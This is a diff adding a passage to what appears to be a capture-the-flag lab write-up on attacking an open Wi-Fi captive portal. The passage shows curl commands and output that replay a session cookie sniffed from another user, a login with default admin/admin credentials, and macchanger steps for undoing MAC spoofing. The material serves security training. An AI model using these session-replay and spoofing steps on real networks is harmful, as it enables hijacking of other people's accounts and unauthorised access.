@@ -210,5 +210,41 @@ Three sessions belonging to two users, free1 and free2, are logged into the pane
 user@debian-thm:~$ curl -s -b "PHPSESSID=REDACTED-1" http://192.168.10.1/index.php
 ```
 
+```console
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WiFi Router Configuration</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+...
+Welcome free1<br><br>Flag: <button onclick="copyFlagToClipboard('THM{REDACTED}')">THM{REDACTED}</button><br><br><br><br>Congratulation! You have logged into password protected page. 
+<a href="logout.php">Click here</a> to Logout.
+```
+
+The flag is obtained without knowledge of any password, from a session another user disclosed over the air.  
+
+The panel also exposes a login form at login.php, and the default admin/admin credentials are accepted. The result differs:  
+
+```console
+user@debian-thm:~$ curl -s -c admin.txt -d "Username=admin&Password=admin&Submit=Submit" http://192.168.10.1/login.php -o /dev/null
+user@debian-thm:~$ curl -s -b admin.txt http://192.168.10.1/index.php
+    <title>WiFi Router Configuration</title>
+...
+Welcome admin<br><br>No FLAG, try logging in with another user ;)  <a href="logout.php">Click here</a> to Logout.
+```
+
+The flag is scoped to the ordinary users rather than the administrator. The weakness demonstrated is not a guessable administrative password. It is that an open network permits an attacker to become a legitimate user by taking their session from the air, and no login page defends against a credential the attacker never enters.  
+
+The tasks that follow address WPA2-PSK, against which the same attack succeeds but requires one additional step.  
+
+One piece of cleanup remains, held back until now because the replay above depended on the spoofed address. openNDS authorises by MAC, so the stolen session only worked while wlan2 still wore the borrowed one, and restoring it earlier would have locked the panel again. With the looting done, restore the card. wlan2 is one of the radios later used to broadcast rogue access points, and such an access point usually adopts whatever MAC its interface carries, so a spoof left in place would give that AP a borrowed BSSID and silently empty any capture filtered on the expected one:  
+
+```console
+user@debian-thm:~$ sudo ip link set wlan2 down
+user@debian-thm:~$ sudo macchanger -p wlan2
+user@debian-thm:~$ sudo ip link set wlan2 up
+```
 
 
